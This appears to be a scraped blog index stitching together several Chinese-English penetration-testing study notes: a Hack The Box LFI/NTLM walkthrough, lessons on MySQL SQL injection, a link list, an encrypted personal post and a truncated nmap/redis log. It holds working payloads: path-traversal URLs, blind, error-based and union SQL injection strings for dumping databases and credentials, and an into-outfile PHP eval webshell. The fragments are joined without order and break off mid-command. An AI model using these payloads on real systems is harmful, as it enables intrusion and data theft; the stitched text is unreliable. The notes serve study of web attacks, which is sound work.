Protocol to interact with remote computers and servers, as well as Operating Systems and applications. WinRM allows the user to : → Remotely communicate and interface with hosts → Execute commands remotely on systems that are not local to you but are network accessible. → Monitor, manage and configure servers, operating systems and client machines from a remote location. As a pentester, this means that if we can find credentials (typically username and password) for a user who has remote management privileges, we can potentially get a PowerShell shell on the host. ❓ Windows远程管理（WinRM）是一种Windows本机内置远程管理协议，基本上使用简单对象访问协议与远程计算机和服务器以及操作系统和应用程序进行交互。WinRM允许用户： → 与主机远程通信和接口 → 在非本地但可通过网络访问的系统上远程执行命令。 → 从远程位置监视、管理和配置服务器、操作系统和客户端机器。 作为pentester，这意味着如果我们能找到具有远程管理权限的用户的凭据（通常是用户名和密码），我们就有可能在主机上获得PowerShell shell。 Website EnumerationOn opening Firefox and putting http:&#x2F;&#x2F;[target ip] , the browser returns a message about being unable to find that site. Looking in the URL bar, it now shows http://unika.htb . The website has redirected the browser to a new URL, and your host doesn’t know how to find unika.htb . This webserver is employing name-based Virtual Hosting for serving the requests. 打开Firefox并放入http:&#x2F;&#x2F;[target-ip]后，浏览器会返回一条无法找到该网站的消息。在URL栏中查看，它现在显示http://unika.htb。该网站已将浏览器重定向到一个新的URL，而您的主机不知道如何找到unika.htb。该Web服务器使用基于名称的虚拟主机来满足请求。 Name-Based Virtual hosting is a method for hosting multiple domain names (with separate handling ofeach name) on a single server. This allows one server to share its resources, such as memory and processor cycles, without requiring all the services to be used by the same hostname.The web server checks the domain name provided in the Host header field of the HTTP request and sends a response according to that. 基于名称的虚拟托管是一种在单个服务器上托管多个域名（每个名称单独处理）的方法。这允许一台服务器共享其资源，例如内存和处理器周期，而不需要同一主机名使用所有服务。web服务器检查HTTP请求的主机头字段中提供的域名，并根据该域名发送响应。The &#x2F;etc&#x2F;hosts file is used to resolve a hostname into an IP address &amp; thus we will need to add an entry in the &#x2F;etc&#x2F;hosts file for this domain to enable the browser to resolve the address for unika.htb . &#x2F;etc&#x2F;hosts文件用于将主机名解析为IP地址&amp;因此，我们需要在该域的&#x2F;etc&#x2F;host文件中添加一个条目，以使浏览器能够解析unika.htb的地址。 Entry in the &#x2F;etc&#x2F;hosts file : 1echo &quot;10.129.136.91 unika.htb&quot; | sudo tee -a /etc/hosts Adding this entry in the &#x2F;etc&#x2F;hosts file will enable the browser to resolve the hostname unika.htb tothe corresponding IP address &amp; thus make the browser include the HTTP header Host: unika.htb inevery HTTP request that the browser sends to this IP address, which will make the server respond with the webpage for unika.htb . 在&#x2F;etc&#x2F;hosts文件中添加此条目将使浏览器能够将主机名unika.htb解析为相应的IP地址，从而使浏览器在向该IP地址发送的每个HTTP请求中都包含HTTP标头Host:unika.htb，这将使服务器以unika.h结核的网页进行响应。On accessing the web page we are presented with a web designing business landing page. 在访问网页时，我们会看到一个网页设计业务登录页。 Checking the site out, we see nothing of particular interest. Although, we notice a language selection option on the navbar EN and changing the option to FR takes us to a French version of the website. 查看网站，我们没有发现任何特别感兴趣的东西。尽管如此，我们注意到导航栏EN上有一个语言选择选项，将该选项更改为FR会将我们带到该网站的法语版本。 Noticing the URL, we can see that the french.html page is being loaded by the page parameter, which may potentially be vulnerable to a Local File Inclusion (LFI) vulnerability if the page input is not sanitized. 注意到URL，我们可以看到french.html页面是由页面参数加载的，如果页面输入没有被清除，它可能会受到本地文件包含（LFI）漏洞的攻击。 File Inclusion VulnerabilityDynamic websites include HTML pages on the fly using information from the HTTP request to include GET and POST parameters, cookies, and other variables. It is common for a page to “include” another page based on some of these parameters. 动态网站包括动态HTML页面，使用HTTP请求中的信息，包括GET和POST参数、cookie和其他变量。一个页面通常会根据其中一些参数“包含”另一个页面。 💡 LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application. A common example is when an application uses the path to a file as input. If the application treats this input as trusted, and the required sanitary checks are not performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code execution as well. 当攻击者能够使网站包含一个不打算作为此应用程序选项的文件时，就会发生LFI或本地文件包含。一个常见的例子是应用程序使用文件的路径作为输入。如果应用程序将此输入视为可信输入，并且未对此输入执行所需的卫生检查，则攻击者可以使用..&#x2F;字符串，并最终查看本地文件系统中的敏感文件。在某些有限的情况下，LFI也可以导致代码执行。 💡 RFI or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote file on the host using protocols like HTTP, FTP etc. RFI或远程文件包含类似于LFI，但在这种情况下，攻击者有可能使用HTTP、FTP等协议在主机上加载远程文件。 We test the page parameter to see if we can include files on the target system in the server response. We will test with some commonly known files that will have the same name across networks, Windows domains, and systems which can be found here. One of the most common files that a penetration tester might attempt to access on a Windows machine to verify LFI is the hosts file, WINDOWS\\System32\\drivers\\etc\\hosts (this file aids in the local translation of host names to IPaddresses). The ..&#x2F; string is used to traverse back a directory, one at a time. Thus multiple ..&#x2F; strings are included in the URL so that the file handler on the server traverses back to the base directory i.e. C:\\ . 我们测试页面参数，看看是否可以在服务器响应中包括目标系统上的文件。我们将使用一些常见的文件进行测试，这些文件将在网络、Windows域和系统中具有相同的名称，这些文件可以在此处找到。渗透测试人员可能试图在Windows机器上访问以验证LFI的最常见文件之一是hosts文件Windows\\System32\\drivers\\etc\\hosts（该文件有助于将主机名本地转换为IP地址）。..&#x2F;字符串用于一次遍历一个目录。因此倍数..&#x2F;字符串包含在URL中，以便服务器上的文件处理程序遍历回基本目录，即C:\\。 12http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts Great, LFI is possible as we can view the contents of the C:\\windows\\system32\\drivers\\etc\\hosts file in the response. 很好，LFI是可能的，因为我们可以在响应中查看C:\\windows\\system32\\drivers\\etc\\hosts文件的内容。The file inclusion, in this case, was made possible because in the backend the include() method of PHP is being used to process the URL parameter page for serving a different webpage for different languages. And because no proper sanitization is being done on this page parameter, we were able to pass malicious input and therefore view the internal system files.在这种情况下，之所以可以包含文件，是因为在后端，PHP的include（）方法被用于处理URL参数页面，以便为不同语言的不同网页提供服务。由于没有对此页面参数进行适当的清理，我们能够传递恶意输入，从而查看内部系统文件。 What is the include() method in PHP? 123456789101112File 1 --&gt; vars.php&lt;?php$color = &#x27;green&#x27;;$fruit = &#x27;apple&#x27;;?&gt;#############################################File 2 --&gt; test.php&lt;?phpecho &quot;A $color $fruit&quot;; // output = &quot;A&quot;include &#x27;vars.php&#x27;;echo &quot;A $color $fruit&quot;; // output = &quot;A green apple&quot;?&gt; https://www.php.net/manual/en/function.include.php What is NTLM (New Technology Lan Manager)? NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-responseauthentication protocol used to authenticate a client to a resource on an Active Directory domain.It is a type of single sign-on (SSO) because it allows the user to provide the underlying authentication factor only once, at login. NTLM是由Microsoft创建的身份验证协议的集合。它是一种质询-响应身份验证协议，用于将客户端身份验证为Active Directory域上的资源。它是一种单点登录（SSO），因为它只允许用户在登录时提供一次底层身份验证因素。 The NTLM authentication process is done in the following way : The client sends the user name and domain name to the server. The server generates a random character string, referred to as the challenge. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the server. The server retrieves the user password (or equivilent). The server uses the hash value retrieved from the security account database to encrypt the challenge string. The value is then compared to the value received from the client. If the values match, the client is authenticated. 💡 NTLM身份验证过程通过以下方式完成： 1.客户端将用户名和域名发送给服务器。 2.服务器生成一个随机字符串，称为挑战。 3.客户端使用用户密码的NTLM哈希对质询进行加密，并将其发送回服务器。 4.服务器检索用户密码（或等效密码）。 5.服务器使用从安全帐户数据库中检索到的哈希值来加密质询字符串。然后将该值与从客户端接收到的值进行比较。如果值匹配，则对客户端进行身份验证。 NTLM与NTHash与NetNTLMv2 关于NTLM身份验证的术语很混乱，甚至专业人士也会不时滥用它，所以让我们定义一些关键术语： 散列函数是一种单向函数，它接受任意数量的数据并返回固定大小的值。通常，结果被称为散列、摘要或指纹。它们用于更安全地存储密码，因为无法将哈希直接转换回原始数据（尽管也有试图从哈希中恢复密码的攻击，我们稍后会看到）。因此，服务器可以存储您的密码散列，当您将密码提交到网站时，它会对您的输入进行散列，并将结果与数据库中的散列进行比较，如果它们匹配，它就会知道您提供了正确的密码。 NTHash是用于在SAM数据库和域控制器中的Windows系统上存储密码的算法的输出。NTHash通常被称为NTLM哈希，甚至只是NTLM，这非常具有误导性&#x2F;混淆性。 当NTLM协议想要通过网络进行身份验证时，它会使用如上所述的质询&#x2F;响应模型。NetNTLMv2质询&#x2F;响应是一个专门格式化为包括质询和响应的字符串。这通常被称为NetNTLMv2哈希，但实际上并不是哈希。尽管如此，它通常被称为哈希，因为我们以同样的方式攻击它。您将看到NetNTLMv2对象被称为NTLMv2，甚至被混淆为NTLM。 Using Responder","tags":["HTB","笔记","STARTING POINT"],"categories":["Range","HTB"]},{"title":"第44天：WEB攻防-PHP应用&SQL盲注&布尔回显&延时判断&报错处理&增删改查方式","path":"/2023/07/11/xiaodi8/web/web攻防笔记第44天/","content":"PHP-MYSQL-SQL操作-增删改查123456789101112131415#1、功能：数据查询查询：SELECT * FROM news where id=$id#2、功能：新增用户，添加新闻等增加：INSERT INTO news (字段名) VALUES (数据)#3、功能：删除用户，删除新闻等删除：DELETE FROM news WHERE id=$id#4、功能：修改用户，修改文章等修改：UPDATE news SET id=$id PHP-MYSQL-注入函数-布尔&amp;报错&amp;延迟原因：不能回显为了解决常规的联合查询注入不行的情况 盲注就是在注入过程中，获取的数据不能回显至前端页面。 我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。 分类我们可以知道盲注分为以下三类： 1、基于布尔的SQL盲注-逻辑判断 regexp,like,ascii,left,ord,mid 2、基于时间的SQL盲注-延时判断 if,sleep 3、基于报错的SQL盲注-报错回显 floor，updatexml，extractvalue 延迟12345and sleep(1);and if(1&gt;2,sleep(1),0);and if(1&lt;2,sleep(1),0);and if(length(database())=7,sleep(10),0);and if(and left(database(),2)=&#x27;pi&#x27;,sleep(10),0); 布尔123456and length(database())=7;and left(database(),1)=&#x27;p&#x27;;and left(database(),2)=&#x27;pi&#x27;;and substr(database(),1,1)=&#x27;p&#x27;;and substr(database(),2,1)=&#x27;i&#x27;;and ord(left(database(),1))=112; 报错123and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)and updatexml(1,concat(0x7e,(SELECT datebase()),0x7e),1)and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); 更多：https://www.jianshu.com/p/bc35f8dd4f7c 参考1234567891011121314151617like &#x27;ro%&#x27; #判断ro或ro...是否成立 regexp &#x27;^xiaodi[a-z]&#x27; #匹配xiaodi及xiaodi...等if(条件,5,0) #条件成立 返回5 反之 返回0sleep(5) #SQL语句延时执行5秒mid(a,b,c) #从位置b开始，截取a字符串的c位substr(a,b,c) #从位置b开始，截取字符串a的c长度left(database(),1)，database() #left(a,b)从左侧截取a的前b位length(database())=8 #判断数据库database()名的长度ord=ascii ascii(x)=97 #判断x的ascii码是否等于97 PHP-MYSQL-注入条件-数据回显&amp;错误处理PHP开发项目-输出结果&amp;开启报错 12#基于延时：都不需要and if(1=1,sleep(5),0) 12#基于布尔：有数据库输出判断标准（数据回显）and length(database())=6 12345#基于报错：有数据库报错处理判断标准（容错处理）注：代码中有`or die(mysqli_error($con));`会报错回显and updatexml(1,concat(0x7e,(SELECT @@version()),0x7e),1)and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) 1234567#测试delete注入：（有无回显，有无报错）删除（延迟）：1 and/or if(1=1,sleep(5),0)删除（布尔）：3 and length(database())=6（无回显 无法判断注入）删除（报错）：4 and updatexml(1,concat(0x7e,(SELECT version),0x7e),1) PHP-MYSQL-CMS案例-插入报错&amp;删除延时1、xhcms-insert报错 1&#x27; and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) and &#x27; 黑盒注入思路盲注：报错和延迟都可以 1、报错：有可能会失败，需要看代码段有没有写那个报错的代码段 2、延迟：大部分都可以，可不可以还要看一个条件：符号的问题，能不能注释闭合 2、kkcms-delete延时 12345and if(1=1,sleep(5),0)or if(1=1,sleep(5),0)or if(ord(left(database(),1))=107,sleep(2),0) 空格：%20 若有单引号过滤，可用ASCII码替换","tags":["笔记","xiaodi8","web攻防"],"categories":["小迪","web攻防"]},{"title":"第43天：WEB攻防-PHP应用&SQL注入&符号拼接&请求方法&HTTP头&JSON&编码类","path":"/2023/07/09/xiaodi8/web/web攻防笔记第43天/","content":"为什么注入失败？由于开发者对于数据类型和SQL语句写法（框架写法）导致SQL注入拼接失败。 注释类型包括：单引号’、百分号%’、框架括号’) 有时候会有无法注释的情况：limit 0, 1、order by –+ 常见注释类型1、数字型(无符号干扰) select * from news where id=$id; 2、字符型（有符号干扰） select * from news where id=&#39;$id&#39;; 3、搜索型（有多符号干扰） select * from news where id like &#39;%$id%&#39; 4、框架型（有各种符号干扰） select * from news where id=(&#39;$id&#39;); select * from news where (id=&#39;$id&#39;); 文件上传有可能会导致注入！ img = union select img_value &#123; &#39;union select&#39; &#125; 插入数据事件insert insert news (&quot;title&quot;, &quot;content&quot;, &quot;author&quot;, &quot;date&quot;, &quot;img&quot;) PHP-MYSQL-数据请求方法（常见）全局变量方法：GET POST SERVER FILES HTTP头等 1、GET：URL上2、POST：URL看不到，但不代表不存在，也是注入点，可用BP抓包改参数3、SERVER：（主要看功能或代码里接收哪个，就改哪个）User-Agent： 使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中） Cookie： 网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据 Rerferer：浏览器向 WEB 服务器表明自己是从哪个页面链接过来的 Host：客户端指定自己想访问的WEB服务器的域名&#x2F;IP 地址和端口号 4、X-Forwarded-For：简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，（通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库or某文件 [通过修改XXF头可以实现伪造IP]） 若在代码中X-Forwarded-For获取到的IP变量写进了sql执行语句中，则可以实现注入。 1234567#源代码中的隐患语句$sql = &quot;select * from admin where ip=&#x27;$ip&#x27;&quot;;#数据包中X-Forwarded-For参数（IP）修改dasdsdas&#x27; union select 1,datebase(),user(),4 and &#x27;1&#x27;=&#x27;1#如果把ip写死去判断，有绕过隐患，ip放在配置文件或代码申明中if（$ip==&#x27;127.0.01&#x27;）&#123;...&#125; 功能点1、用户登录时 2、登录判断IP时 是PHP特性中的$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];接受IP的绕过（可伪造，绕过） 实现：代码配置固定IP去判断-策略绕过 实现：数据库白名单IP去判断-select注入 实现：防注入，记录IP去保存数据库-insert注入 3、文件上传将文件名写入数据库-insert注入 PHP-MYSQL-数据请求格式1、数据采用统一格式传输，后端进行格式解析带入数据库（json） 2、数据采用加密编码传输，后端进行解密解码带入数据库（base64）-CapyfCncoder V3","tags":["笔记","xiaodi8","web攻防"],"categories":["小迪","web攻防"]},{"title":"Poc编写相关资料","path":"/2023/07/08/漏洞/Poc编写相关资料/","content":"Xray官方编写poC文档：https://docs.xray.cool/#/guide/yaml/yaml_poc_template 漏洞检测的那些事：https://paper.seebug.org/9/","tags":["笔记","漏洞","Poc"],"categories":["Vulnerability","SRC"]},{"title":"发小","path":"/2023/07/07/胡言乱语/发小/","content":"52a6e79cae0b992e36c7cfa02583cb600a471e265d5f54126d5feeedcf147c3a35f28a8fef3365dcf06bb309a2f517f30d200b73b2bd6697ac0f87eb0af55b7a30473d8376bdb7dcdcdfeedc2d82987586bf43b7ac6a4b58b9620f2140fc015a3be1fd3905587c6b9f1af2297bb2a5a293e65d367c8db14374d3b0231bb8e84dc24101e9cce75502f61c0d37fbbe01afc4531835d708ce5821790376cdf059e56dfc8adf2a04742b3b7813bd47a21a8269221c0260a4333dd4155c8e2ceb692e898964f8f315778123b04d26c2d6cbd5770814f4d87d167000a7689961f0b811bd4a9f52897b32f39eec761d2440d0bc4a84d4dcfc8f43efd972c9e2d782e9ca6c7c937ce42d956137b87349f6b4aee89e95dcd46663b59a36daef0c7004b8e22a73ce210949a5e4942d128de9170c71ede48deaf5731923d7966a41d1f80551494478cde1e745ec111c7b8ee6ca8681e8f91feb25d1777257603ecce2b823b1c82ac2fddde6e4021c7bd9427c81af8d2d066752e2ac8e986878676a43f9d065a36485af5f6468dc6f1307b1054b27cc6828bbbeaa623807ed8c135f75179359a1547e74fde0274a1385bc6a703a176ee127e2f33d36816a02e237bef2a36ba21233542b805ab057cb4d24ab0a63b4fa5a06f93df45f335d5ce897f4de7648da7f6e7e35ffb6cc2f780beb6edafb04f5551777e2c3620d2e2521f353c83b18f7adeff3255d13b1980ed423825b460d0847d4f875529e013e910e269e26b72350f262899644dae32aedb1ec2094c0c4dc543c1068b3b41919f0c516a531d68a745126710d850a66dc233c03e16fc413a2c0ad23a52afce84111d7a6d509d0e8c77034415ef175310e467fd9f4e94a9ff6ce3cbaa6b661d20f9184ae553f343ddde80b689fa30c42f4fc19a64abc682c3f490032cb1cf0c85a6324a99a0d3afa9d0687da516b1efc6afaab27609f15e6091f7869a9706a24b9f9309e1acbe55439effef39c6e90eeb1e259d300efaf13c54f5375a53da2dfa0a79b8ef7cae2689f59dc7b5ddf1ab9bc108b06e54d7846615e50203e91612dd79e4635e7ed6fb219210df8d084297d3e625df0a2d69b44294a7e2b3ea76ec2691c844c9e55db3064653e34d60fbd8ead1cd52b389056af10d1d4b43f1048b78259bf3b55f3d24d5a735945dc74ed9bb088bcf698b968d0db144b8f9310d88eaf2e61ceda939bd50c9842132b6b3c7886c6d6cd59e78c373de07a842021f1d444ce197eaa454c4b1ea2620192e1164ef6e0625b5779afce2e6c3e75871b67f1eda47477ead00564f67ce21f20acc0ec137ef19c68dee066fa58e562220bff41c855143fc274d2a1c22d06f28da19b62f6eb8c6a4da13db7bbcef1a78b9bc5cdeaa898de46cf4412a13c1bbfd12c5799da94f41b77ff57df20b322de5e2908b3be56c09856e924ece4672a1801f6239f14c1f8a137b157795e6b19983b5b9ec02f426f02accf8c3f53c74a969a7b2396a7ce52984e02737cc82133f44293184eb51671d640572a9de5ff5fdd1cbfb8724d465d44fa64328e9d615f89df06918a487892cd837441ef7cf946fbe810f66cf63ce9d56d6ee1a570f45f8184907063102e67b9c3848eccebd0ea57d02992f31d045c20130c7e71a88d70b51836bb5092342b860e64fa4a285365d86c6b96b38fa97c91b94af847698e44cc82827d91abbe8db0ea4c7940a317e84d9f65ae6445495df1c90ff870604d67c71f1694951560c4b6de374093afdb6529e9ae38deee6d6eb84936d504a6a3e5063e0212fe664591fd15248403d367e086c24e190845f685eb9694a783f288050f6b94fbd79fb4480b62116e79a5f892b612b0cc254a8092f892a29aeb4b29237de1d3de6b047b4913f4df19967338f62699d8345e3bb43e9c120955b63e4ec5efa2c5c9a1e50dfa5ed35b36826d8aa3468eadf171b1f4ea58bdaf7f431445064e33c910de1cdc007d62168f0d432e983a964b0bd33320bbca2ffe19db9af384f0513e3d869bd5d97f914f00de0a24452489a4a61c66d739d4bbac45a7de47af708aef4ff3374f8e7d31f43ad020d899c221d789a8072698c39a48ba892da32ba3a0498e90fac0351547ba8d2adcba3f0130e78c91bad7196f19a39e1e685187f131ef049e2c3520dcd193d4aec0d52df80eee4a19ad9431cca4785432a1e09e7e18a13ca843c6b3644984411446f8197f69578ccf74283a75e64a66b663c54ffad30b19e4fd8aef638c22bb067e4a5f5717eb92e1610109f3af79af03ba9bb637ebdadc6ab396c663cec4b6540686323c4c6ad4acb123d2f659dd1bd408b4116c59a8428fba069c86c155725d25a856c2d730d331303173d97935d972fefa42138dbf04d2bcf394c7565ecc1edcd67d3d5e11b49e1c624d4ad3774faf23beb750fea272fed4cb964504a70c1a52c1b9108c15d0601cd84bf09a7c6486a25302fd37ddedf1c39dadfb59213820556be24942adfb32454de8c5a2474445428e15f92504d0ac74fb6437d975473a75f086b4698075f58233690ac1d494a1889ada81e82afcbd9fada800895fef74b813e8c0867acbe431bb297926d99806cd4cd7cc37f013ebf37315a23833d0ba36234d8fd6d725e6f8f157f90ae1bf1e2f58792c0f238b8e9714f61822f3673685483827a9532653bb558e507549609085db4ef8a430060b251f41d0fe8b5ff0ef705577e21ea8c479b7539eb9615d15c11480871c229ffbeb69f14c31da52d88f1bdf0a81a1ca434ddef41ed33f6986813657a71033372b97d5d2c929dcbebf67cf638b0d98b252c2ecc48b1ca30daec71d89c2ee92dc21d9c02b923cf4a27eba88a8a316fa10bfccc803285c17768b085138bc943c3d7a76ca57dd626f42dad24b0b82e4db224077205ab8963fd46466440695df23bc01131abfb5a2a2892ac3b58e662afeb5797aafdb9325d86f50e98b99b012b916f1e9ff6b772911e74472cdb2a428fa42bb85b5afa98be7d529ece64ae5f64381bda0343ac96f99aea30cce8125018ad211a9eb6c104d670b8def00f7535abb1272f747e51facff84c37be042598bef06546f915681ec2ed6c10cebcc24d386bc0e7007da4064e0c4ed54acda7ac8133b4c8351f783e51d29ffd578b5549ed000d155675da805d89d46a90c0263901663457fa818ee0ad2b85d152f3d3ae6d08c11c6a3783c363d6d92dfb5971897c3855ada76830bc6ff9df4761dfe61d6b6d97f59d2fe566b286abcf464067e317fddd669eb681bdd6c85148ce49366bb9709331cb8d8c887100a571fd3ab420d6247a23dc82ced9a1167723e403d685055eafc1823d5fb5ef704723741344bbfe071487048b9aa8dfd1eb8ccd9e25c7cb23cf2866f3afc57d4d4ae67d71742593292335a8cda6ca1435430cca05fe16cb8a93b1610ec6b28b488d1621cdf25301e8155854a9d18968144087cf4f6d2cccbf870f68f37bda80238685b9f9fb1d2b2b87b21c43427548b9875dc081b8ed2705d056efa53e73851277211e79bbe0953b08069274b9021b39957153a978b7487ce92ac475e78d6ab38e9f1d1c088805597cd54f45375e144f956d2349a224bbc33605cc43e16b7c93519d6df7915c2ed7dc241fb71ad58f03384f62c3c74224358839a420b7f8fda0f95b2a878d256e9f583d740f5f08f58e937c0be22b4a4146eef1e83b61ce809490577faa138e58f9e41c6319c0dd5e92c7b05c2b20cacd8ad3bb1147dcec25d1c068527f8322b1d177442481948f029a5f7837c3efe468f733fb94f47e327f97ae77249801ce6a0346d5e52193b5b52035776 您好, 我没有主动给密码就说明你没有权限."},{"title":"第42天：WEB攻防-PHP应用&MYSQL架构&SQL注入&跨库查询&文件读写&权限操作","path":"/2023/07/05/xiaodi8/web/web攻防笔记第42天/","content":"Ⅰ 数据库管理方式mysql里面有内置的管理用户，其中root就是默认数据库管理员用户，网站上面的数据库都在mysql中，由root或一对一用户去管理。 1、数据库root（自带默认）统一管理 每个网站的数据库都由root用户统一管理。 1234mysql root（自带默认） 网站A testA 网站B testB 2、数据库一对一管理（不同用户）【推荐】 自己的网站单独创建数据库用户去管理自己的数据库 1234567891011121314mysql 数据库名A 表名 列名（字段） 数据 数据库名B 表名 列名（字段） 数据Assess（单个） 表名 列名（字段） 数据 目的：获取数据 肯定可以一步步得到信息 Ⅱ SQL注入MYSQL注入思路：（目的获取当前web权限）1、判断常见四个信息（系统，用户，数据库名，版本） 2、根据四个信息去选择方案 root用户：先测试读写，后测试获取数据 非root用户：直接测试获取数据 2.1ACCESS SQLMAPaccess sqlmap爆破依赖字典，不一定能猜到表名列名。 2.2 SQL注入原理接受的参数值未进行过滤直接带入SQL查询的操作，就是SQL注入产生的原理。 攻击：利用SQL语句执行你想要的东西（SQL语句能干嘛，注入就能干嘛） SQL语句能干嘛 &#x3D; SQL语句由谁决定 &#x3D;&gt; 数据库类型决定 (为什么mysql注入 oracle注入叫法原因) 2.3 PHP-MYSQL-SQL常规查询1、数据库版本-看是否符合information_schema查询-version()：mysql5.0以上 2、数据库用户-看是否符合ROOT型注入攻击-user()：是否可跨库查询 3、当前操作系统-看是否支持大小写或文件路径选择-@@version_compile_os 4、数据库名字-为后期猜解指定数据库下的表，列做准备-database() 2.2.1 information_schemaMYSQL5.0以上版本：自带的数据库名information_schema information_schema：存储数据库下的数据库名及表名，列名信息的数据库 information_schema.schemata：记录数据库名信息的表 information_schema.tables：记录表名信息的表 information_schema.columns：记录列名信息表 schema_name：information_schema.schemata记录数据库名信息的列名值 table_schema：information_schema.tables记录数据库名的列名值 table_name：information_schema.tables记录表名的列名值 column_name：information_schema.columns记录列名的列名值 2.2.2 MYSQL注入查询含义 - 依赖information_schema1、order by {阿拉伯数字} ：查询一共有几列列名； 2、union select 1,2,3,4,5,6 ：看页面回显的数字，可以将其替换成所需目标信息（版本号、数据库名、操作系统等等）； 3、verson()、database()、user()、@@version_complie_os； 4、group_concat() ：拼接字符串。将group by产生的同一个分组中的值连接起来，返回一个字符串结果。 4.1、group_concat()语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc&#x2F;desc ] [separator ‘分隔符’] ) 中括号可选 4.2、MySQL中concat()、concat_ws()、group_concat()函数使用技巧与心得：https://zhuanlan.zhihu.com/p/257399676 5、from information_schema.tables where table_schema=&#39;demo01&#39; 固定数据库名(前面查到的datebase())； 6、from information_schema.columns where table_name=&#39;admin&#39; 固定表名（5步骤查到了） 7、limit： 12345678910111213order by 6 union select 1,2,3,4,5,6union select 1,2,3,database(),user(),6union select 1,2,3,version(),@@version_compile_os,6#5查询数据库名demo01下的表名信息（借助information_schema.tables存储查询）union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema=&#x27;demo01&#x27;#6查询数据库名demo01下的表名admin的列名信息（借助information_schema.columns存储查询）union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_schema=&#x27;demo01&#x27; and table_name=&#x27;admin&#x27;#7知道表名列名可以一步到位查询union select 1,2,3,username,password,6 from admin limit 0,1 2.4 PHP-MYSQL-SQL跨库查询（第一种数据库管理方式root导致）2.4.1 跨库查询概念含义：通过B网站的注入点获取A网站的账号密码 影响条件：当前数据库ROOT用户权限 测试不同数据库用户：root demo 2.4.2跨库示例12345678#获取mysql下所有数据库名：http://IP/new.php?id=1 union select 1,2,3,group_concat(schema_name),5,6 from information_schema.schemata#获取zblog数据库中的表名：http://IP/new.php?id=1 union select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema=&#x27;zblog&#x27;#获取zbp_member表中的列名：http://IP/new.php?id=1 union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_schema=&#x27;zblog&#x27; and table_name=&#x27;zbp_member&#x27;union select 1,2,3,mem_Name,mem_Password,6 from zblog.zbp_member 解决：单引号过滤绕过方式 SQL注入语句中用单引号就不要编码，编码就不用单引号（路径，表名，数据库名等） 2.5文件读写（已少见）影响条件1、当前数据库用户权限：测试不同数据库用户（root demo） 2、secure-file-priv设置路径限定，则无法文件读写上传后门 示例1234#可单引号中加后门上传&lt;?php eval($_POST[x]);?&gt;union select 1,load_file(&#x27;d:\\\\1.txt&#x27;),3,4,5,6#outfile后的读写路径还需寻找union select 1,&#x27;xiaodi&#x27;,3,4,5,6 into outfile &#x27;d:\\\\2.txt&#x27; 注：文件路径也可用编码上传 读写的路径的问题1、报错显示获取路径 2、phpinfo页面泄漏 如果不知道路径，思路： 利用常见的默认的中间件，数据库等安装路径读取有价值信息","tags":["笔记","xiaodi8","web攻防"],"categories":["小迪","web攻防"]},{"title":"HTB-Redeemer","path":"/2023/07/03/HTB/HTB-Redeemer/","content":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358ubuntu@ip:~$ nmap -p- -sV 10.129.68.30Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 13:59 UTCNmap scan report for ip-10-129-68-30.us-west-1.compute.internal (10.129.68.30)Host is up (0.076s latency).Not shown: 65534 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION6379/tcp open redis Redis key-value store 5.0.7Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 34.55 secondsubuntu@ip:~$ sudo apt install redis-toolsReading package lists... DoneBuilding dependency tree... DoneReading state information... DoneThe following additional packages will be installed: libatomic1 libjemalloc2 liblua5.1-0 liblzf1 lua-bitop lua-cjsonSuggested packages: ruby-redisE: Could not get lock /var/cache/apt/archives/lock. It is held by process 23850 (apt-get)N: Be aware that removing the lock file is not a solution and may break your system.E: Unable to lock directory /var/cache/apt/archives/ubuntu@ip-172-31-17-119:~$ sudo apt install redis-toolsReading package lists... DoneBuilding dependency tree... DoneReading state information... DoneThe following additional packages will be installed: libatomic1 libjemalloc2 liblua5.1-0 liblzf1 lua-bitop lua-cjsonSuggested packages: ruby-redisE: Could not get lock /var/cache/apt/archives/lock. It is held by process 23850 (apt-get)N: Be aware that removing the lock file is not a solution and may break your system.E: Unable to lock directory /var/cache/apt/archives/ubuntu@ip:~$ sudo rm -rf /var/cache/apt/archives/lockubuntu@ip:~$ sudo apt-get updateHit:1 http://us-west-1.ec2.archive.ubuntu.com/ubuntu jammy InReleaseGet:2 http://us-west-1.ec2.archive.ubuntu.com/ubuntu jammy-updates InRelease [119 kB]Get:3 http://us-west-1.ec2.archive.ubuntu.com/ubuntu jammy-backports InRelease [108 kB]Get:4 http://security.ubuntu.com/ubuntu jammy-security InRelease [110 kB] Fetched 337 kB in 1s (426 kB/s) Reading package lists... Doneubuntu@ip:~$ sudo apt install redis-toolsReading package lists... DoneBuilding dependency tree... DoneReading state information... DoneThe following additional packages will be 